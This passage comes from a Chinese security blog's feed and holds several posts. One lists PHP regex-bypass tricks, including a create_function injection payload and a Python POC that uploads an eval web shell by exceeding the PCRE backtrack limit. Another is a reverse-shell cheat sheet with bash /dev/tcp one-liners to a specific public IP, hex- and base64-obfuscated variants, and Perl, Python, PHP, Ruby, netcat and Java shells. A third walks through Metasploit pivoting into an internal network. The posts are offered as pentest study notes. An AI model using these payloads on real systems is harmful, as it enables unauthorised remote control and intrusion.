class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>EXP编写</tag>
        <tag>知识积累</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】正则绕过总结一下</title>
    <url>/posts/116.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>正则绕过知识总结</li>
</ul>
</blockquote>
<h1 id="一、换行符绕过"><a href="#一、换行符绕过" class="headerlink" title="一、换行符绕过"></a>一、换行符绕过</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;^flag$&#x2F;i&#39;, $c) &amp;&amp; $c !&#x3D;&#x3D; &#39;flag&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &quot;nonono&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828143654446.png" alt="image-20210828143654446"></p>
</blockquote>
<h1 id="二、数组绕过"><a href="#二、数组绕过" class="headerlink" title="二、数组绕过"></a>二、数组绕过</h1><p><strong>preg_match只能处理字符串，当传入的subject是数组时会返回false</strong></p>
<h1 id="三、-5c绕过"><a href="#三、-5c绕过" class="headerlink" title="三、%5c绕过"></a>三、%5c绕过</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$action= $_GET[<span class="string">'action'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">$arg= $_GET[<span class="string">'arg'</span>] ? $_GET[<span class="string">'arg'</span>]: <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$action)) &#123;</span><br><span class="line"></span><br><span class="line">	show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">	$action(<span class="string">''</span>, $arg);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>题目要求我们需要绕过正则才可以任意命令执行<br>正则的意思：<code>/^[a-z0-9_]*$/isD</code></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;i不区分大小写</span><br><span class="line"></span><br><span class="line">&#x2F;s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]</span><br><span class="line"></span><br><span class="line">&#x2F;D如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?action&#x3D;\create_function&amp;arg&#x3D;return%271%27;&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828145411198.png" alt="image-20210828145411198"></p>
</blockquote>
<h1 id="四、PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#四、PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="四、PHP利用PCRE回溯次数限制绕过某些安全限制"></a>四、PHP利用PCRE回溯次数限制绕过某些安全限制</h1><p>参考文章<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">Leavesongs</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> preg_match(<span class="string">'/&lt;?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line"><span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">@mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">$path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line">header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p>
<p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。</p>
<p>而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p>
<ul>
<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li>
</ul>
<p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</p>
</blockquote>
<h2 id="回溯的过程"><a href="#回溯的过程" class="headerlink" title="回溯的过程"></a>回溯的过程</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">所以，我们题目中的正则&lt;\?.*[(&#96;;?&gt;].*，假设匹配的输入是&lt;?php phpinfo();&#x2F;&#x2F;aaaaa，实际执行流程是这样的：</span><br></pre></td></tr></table></figure></div>

<p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/51bfc7bb-fd9a-402e-971a-a2247b226f3d.png" alt="img"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">见上图，可见第4步的时候，因为第一个.*可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是&#x2F;&#x2F;aaaaa。但此时显然是不对的，因为正则显示.*后面还应该有一个字符[(&#96;;?&gt;]。</span><br><span class="line"></span><br><span class="line">所以NFA就开始回溯，先吐出一个a，输入变成第5步显示的&#x2F;&#x2F;aaaa，但仍然匹配不上正则，继续吐出a，变成&#x2F;&#x2F;aaa，仍然匹配不上……</span><br><span class="line"></span><br><span class="line">最终直到吐出;，输入变成第12步显示的&lt;?php phpinfo()，此时，.*匹配的是php phpinfo()，而后面的;则匹配上[(&#96;;?&gt;]，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配;，14步匹配.*，第二个.*匹配到了字符串末尾，最后结束匹配。</span><br><span class="line"></span><br><span class="line">这里回溯了八次</span><br></pre></td></tr></table></figure></div>

<h2 id="PHP的pcre-backtrack-limit限制利用"><a href="#PHP的pcre-backtrack-limit限制利用" class="headerlink" title="PHP的pcre.backtrack_limit限制利用"></a>PHP的pcre.backtrack_limit限制利用</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。我们可以通过var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));的方式查看当前环境下的上限：</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828165314190.png" alt="image-20210828165314190"></p>
</blockquote>
<p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/e1ef3f44-8ea8-4156-94f4-f860e47e9152.d62407cb720d.png" alt="image.png"></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828165602333.png" alt="image-20210828165602333"></p>
</blockquote>
<p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828165804456.png" alt="image-20210828165804456"></p>
</blockquote>
<p>那么这道题的答案就呼之欲出了，我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p>
<p>对应的POC如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&quot;</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;</span><br><span class="line">    &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[cmd]);&#x2F;&#x2F;&#39;+b&#39;a&#39;*1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.post(url,files&#x3D;files, allow_redirects&#x3D;False)</span><br><span class="line">print(r.headers[&#39;Location&#39;])</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828170934106.png" alt="image-20210828170934106"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】反弹shell方法备忘录</title>
    <url>/posts/157.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>bash反弹：首先公网主机监听指定端口，然后肉鸡执行bash命令向公网指定端口发送连接请求</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">公网主机：</span><br><span class="line">	nc -lvvp 9090</span><br><span class="line">肉鸡执行：</span><br><span class="line">	bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;47.99.163.64&#x2F;3389 0&gt;&amp;1&#39;</span><br><span class="line">		其中144.34.164.217为自己的公网主机</span><br></pre></td></tr></table></figure></div>

<p>对命令的解释：</p>
<blockquote>
<p>bash -c 把后面字符串当做命令执行</p>
<p>bash -i意为创建一个交互式的bash shell<br>&amp;&gt;意为将标准输出和标准错误都重定向到我们指定的文件中，下面实验</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">x@DESKTOP-GR9LS16:~$ cat 1</span><br><span class="line">I get some words here!!</span><br><span class="line">x@DESKTOP-GR9LS16:~$ cat 2</span><br><span class="line">cat: 2: No such file or directory</span><br><span class="line">x@DESKTOP-GR9LS16:~$ cat 1 &amp;&gt; 2</span><br><span class="line">x@DESKTOP-GR9LS16:~$ cat 2</span><br><span class="line">I get some words here!!</span><br></pre></td></tr></table></figure></div>

<p>可以看到标准错误和标准输出都被重定向到了文件2中</p>
<p>至于后面的/dev/tcp/144.34.164.217/9090，这是一个特殊文件，它会建立一个连接到到144.34.164.217:9090的socket</p>
<p>最后一个0&gt;&amp;1，意为将文件描述符0重定向到文件描述符1，也就是标准输入被重定向到了标准输出</p>
<p>我们来分析一下，首先&amp;&gt;使得标准输出重定向到了我们的TCP连接上，然后0&gt;&amp;1使得标准输入又重定向到了标准输出中，最终的结果就是标准输入也被重定向到了TCP连接中，因此输入和输出都可以在公网主机上进行，通过TCP连接和bash进行交互</p>
<h3 id="十六进制形式反弹shell"><a href="#十六进制形式反弹shell" class="headerlink" title="十六进制形式反弹shell"></a>十六进制形式反弹shell</h3><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926090327715.png" alt="image-20210926090327715"></p>
</blockquote>
<p>bash -i &amp;&gt;/dev/tcp/192.168.136.134/1234 0&gt;&amp;1</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">echo &quot;62617368202d6920263e2f6465762f7463702f3139322e3136382e3133362e3133342f3132333420303e2631&quot;|xxd -r -p|bash</span><br></pre></td></tr></table></figure></div>

<h2 id="base64反弹shell"><a href="#base64反弹shell" class="headerlink" title="base64反弹shell"></a>base64反弹shell</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">echo &quot;YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC41Ni4xLzEyMzQgMD4mMScK&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure></div>

<p>If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.</p>
<p>If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.</p>
<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.</p>
<p>The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute “/bin/sh -i” with “cmd.exe”.</p>
<p>Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they’re quite short lines, but not very readable.</p>
<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/" target="_blank" rel="noopener">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>

<h3 id="PERL"><a href="#PERL" class="headerlink" title="PERL"></a>PERL</h3><p>Here’s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell" target="_blank" rel="noopener">perl-reverse-shell</a>:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure></div>

<p>There’s also an <a href="http://www.plenz.com/reverseshell" target="_blank" rel="noopener">alternative PERL revere shell here</a>.</p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>This was tested under Linux / Python 2.7:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure></div>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure></div>

<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">php-reverse-shell</a>.</p>
<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure></div>

<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure></div>

<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498" target="_blank" rel="noopener">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure></div>

<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure></div>

<p>[Untested submission from anonymous reader]</p>
<h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br></pre></td></tr></table></figure></div>

<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Xnest :1</span><br></pre></td></tr></table></figure></div>

<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure></div>

<h3 id="Further-Reading"><a href="#Further-Reading" class="headerlink" title="Further Reading"></a>Further Reading</h3><p>Also check out <a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html" target="_blank" rel="noopener">Bernardo’s Reverse Shell One-Liners</a>.  He has some alternative approaches and doesn’t rely on /bin/sh for his Ruby reverse shell.</p>
<p>There’s a <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387" target="_blank" rel="noopener">reverse shell written in gawk over here</a>.  Gawk is not something that I’ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>【内网穿透】metasploit跨路由进内网</title>
    <url>/posts/113.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>metasploit 通过增加路由来扫描对应端口</li>
</ul>
</blockquote>
<h1 id="路由方式进内网"><a href="#路由方式进内网" class="headerlink" title="路由方式进内网"></a>路由方式进内网</h1><p>首先提权到了system权限</p>
<p>1、看有几个网段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825101511830.png" alt="image-20210825101511830"></p>
</blockquote>
<p>2、增加一个网段的路由</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.0.0&#x2F;24</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 查看当前路由</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825101832048.png" alt="image-20210825101832048"></p>
</blockquote>
<p>3、保存sessions然后记住id，接着创建一个socks4a代理</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks_proxy</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825102647725.png" alt="image-20210825102647725"></p>
</blockquote>
<p>接着将VERSION设置为4a</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">set VERSION 4a</span><br></pre></td></tr></table></figure></div>

<p>接着直接run，就成功设置了1080端口socks4a协议</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825102726771.png" alt="image-20210825102726771"></p>
</blockquote>
<p>4、设置4a代理，利用proxychains4</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf &#x2F;&#x2F;设置ip地址</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825102931404.png" alt="image-20210825102931404"></p>
</blockquote>
<p>接着就可以利用proxychains直接访问192.168.0.111的内网</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn -v 192.168.0.111</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825103302020.png" alt="image-20210825103302020"></p>
<p>接着当我们找出3389端口的密码之后，可以直接利用rdesktop来连接3389的远程桌面，xshell会自动帮你开启桌面窗口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 rdesktop 192.168.0.111 &#x2F;&#x2F;-g 1980*1080 这是调整分辨率的 -f 表示全屏</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825105439505.png" alt="image-20210825105439505"></p>
</blockquote>
<p>这里说一点坑，由于我公网服务器并不是kali，只是centos的系统，所以需要安装rdesktop来进行远程登录</p>
<h1 id="安装rdesktop"><a href="#安装rdesktop" class="headerlink" title="安装rdesktop"></a>安装rdesktop</h1><p>1、下载仓库文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;li.nux.ro&#x2F;download&#x2F;nux&#x2F;dextop&#x2F;el7&#x2F;x86_64&#x2F;nux-dextop-release-0-5.el7.nux.noarch.rpm</span><br></pre></td></tr></table></figure></div>

<p>2、安装仓库</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">rpm -Uvh nux-dextop-release-0-5.el7.nux.noarch.rpm</span><br></pre></td></tr></table></figure></div>

<p>3、安装远程桌面程序</p>
